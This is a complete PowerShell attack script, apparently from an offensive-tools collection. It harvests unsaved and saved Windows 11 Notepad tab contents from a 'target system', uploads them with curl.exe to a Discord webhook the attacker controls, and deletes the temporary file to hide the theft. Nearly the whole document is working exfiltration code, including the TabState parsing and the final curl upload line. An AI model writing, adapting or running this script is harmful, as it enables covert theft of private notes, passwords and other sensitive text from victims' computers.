<#========================== Notepad Tab Contents to Discord ===============================

SYNOPSIS
In Windows 11 notepad stores unsaved tabs for reopening notepad.... very unsafe. 
This is a script to find any unsaved notes in notepad and send them to a discord webhook.

USAGE
1. Uncomment and Change YOUR_WEBHOOK_HERE to your own webhook
2. run the script on a target system.
3. Check Discord for results

#>

# $dc = 'YOUR_WEBHOOK_HERE' 

$hookurl = "$dc"

$outpath = "$env:TMP\notepad.txt"

$appDataDir = [Environment]::GetFolderPath('LocalApplicationData')
$directoryRelative = "Packages\Microsoft.WindowsNotepad_*\LocalState\TabState"
$matchingDirectories = Get-ChildItem -Path (Join-Path -Path $appDataDir -ChildPath 'Packages') -Filter 'Microsoft.WindowsNotepad_*' -Directory

foreach ($dir in $matchingDirectories) {
    $fullPath = Join-Path -Path $dir.FullName -ChildPath 'LocalState\TabState'
    $listOfBinFiles = Get-ChildItem -Path $fullPath -Filter *.bin
    foreach ($fullFilePath in $listOfBinFiles) {
        if ($fullFilePath.Name -like '*.0.bin' -or $fullFilePath.Name -like '*.1.bin') {
            continue
        }

        $seperator = ("=" * 60)
        $SMseperator = ("-" * 60)
        $seperator | Out-File -FilePath $outpath -Append
        $filename = $fullFilePath.Name
        $contents = [System.IO.File]::ReadAllBytes($fullFilePath.FullName)
        $isSavedFile = $contents[3]

        if ($isSavedFile -eq 1) {
            $lengthOfFilename = $contents[4]
            $filenameEnding = 5 + $lengthOfFilename * 2
            $originalFilename = [System.Text.Encoding]::Unicode.GetString($contents[5..($filenameEnding - 1)])
            "Found saved file : $originalFilename" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            Get-Content -Path $originalFilename -Raw | Out-File -FilePath $outpath -Append


        } else {
            "Found an unsaved tab!" | Out-File -FilePath $outpath -Append
            $filename | Out-File -FilePath $outpath -Append
            $SMseperator | Out-File -FilePath $outpath -Append
            $filenameEnding = 0
            $delimeterStart = [array]::IndexOf($contents, 0, $filenameEnding)
            $delimeterEnd = [array]::IndexOf($contents, 1, $filenameEnding)

            $fileMarker = $contents[($delimeterStart + 2)..($delimeterEnd - 1)]
            $fileMarker = -join ($fileMarker | ForEach-Object { [char]$_ })

            $originalFileContents = [System.Text.Encoding]::Unicode.GetString($contents[($delimeterEnd + 4 + $fileMarker.Length)..($contents.Length - 6)])
            $originalFileContents | Out-File -FilePath $outpath -Append
        }
     "`n" | Out-File -FilePath $outpath -Append
    }
}

curl.exe -F file1=@"$outpath" $hookurl
Sleep 2
Remove-Item -Path $outpath -force